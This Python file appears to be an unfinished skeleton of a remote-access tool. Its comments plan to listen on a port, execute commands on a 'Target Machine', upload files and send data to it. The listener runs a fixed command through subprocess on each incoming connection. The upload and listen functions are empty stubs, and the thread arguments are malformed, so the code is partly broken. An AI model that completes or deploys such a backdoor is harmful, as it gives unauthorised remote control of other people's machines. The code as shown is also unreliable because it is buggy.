from threading import Thread
import subprocess
import socket
# Jobs:
# 1} listen on a port
# 2} Execute commands on Target Machine
# 3} Upload file from Host to Target
# 4} Send Data to Target (strings)

def execute_command(my_command):
    # needs testing for output text

    try: command_output = subprocess.run(my_command.strip())
    except Exception as ex: command_output = ex

    return command_output

def listen_data():
    pass

def upload_file(file_to_upload):
    pass

def listener_handler(target_ip, target_port, function, function_args):
    
    tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    tcp_server.bind((target_ip,target_port))
    tcp_server.listen(5)

    # loop code to continuisly listen on target_port
    while True:
        client_socket, client_address = tcp_server.accept()
        print(f"Connection from {client_address}")
        # Add Params for listen
        #if function = "LISTEN": handler_thread = Thread(target=listen_data)
        #elif function = "UPLOAD": handler_thread = Thread(target=upload_file)
        if function == "EXECUTE": handler_thread = Thread(target=execute_command, args=("dir"))      

        handler_thread.start()

